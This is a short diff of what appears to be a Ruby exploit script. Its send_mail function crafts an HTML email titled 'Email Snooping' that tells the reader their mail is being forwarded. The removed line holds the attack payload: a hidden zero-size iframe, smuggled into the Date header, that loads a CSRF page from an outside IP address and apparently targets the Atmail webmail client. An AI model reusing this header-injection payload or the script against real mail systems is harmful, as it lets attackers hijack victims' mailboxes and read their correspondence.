@@ -13,7 +13,7 @@ def send_mail(smtpsrv, username, password, frmemail, dstemail)
 
   msg  = "From: #{frmemail}\n"
   msg += "To: #{dstemail}\n"
-  msg += "Date: <iframe src=\"http://1.1.1.4/ooo/atmail-CSRFiframe.html\" width=0 height=0 style=\"hidden\" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n"
+  msg += "Date: #{date}\n"
   msg += "Subject: Email Snooping\n"
   msg += "Content-type: text/html\n\n"
   msg += "<strong>Hi<br>All Your Email is Forwarded to us!</strong>"
